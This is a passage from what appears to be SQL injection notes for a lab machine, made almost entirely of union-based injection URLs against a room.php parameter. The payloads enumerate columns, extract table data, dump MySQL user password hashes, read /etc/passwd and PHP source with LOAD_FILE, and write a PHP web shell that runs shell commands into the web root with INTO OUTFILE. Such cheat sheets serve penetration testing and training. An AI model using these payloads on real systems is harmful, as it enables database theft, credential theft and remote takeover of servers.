http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+1,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+2,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+3,1--+
```

### Extracting Data from the Columns

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+0,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+1,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+2,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,concat(<column1>,<column2>),4,5,6,7+from+<tablename>+limit+3,1--+
```

### List Password Hashes (from MySQL DB)

```powershell
http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(host,":",user,":",password,"\r\n")+from+mysql.user),4,5,6,7--
```

### Read files from DB (Load File)

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,load_file('/etc/passwd'),4,5,6,7--
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,(TO_base64(LOAD_FILE("/var/www/html/<file.php>"))),4,5,6,7-- (in base64)
```

### Upload php command injection file

```powershell
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

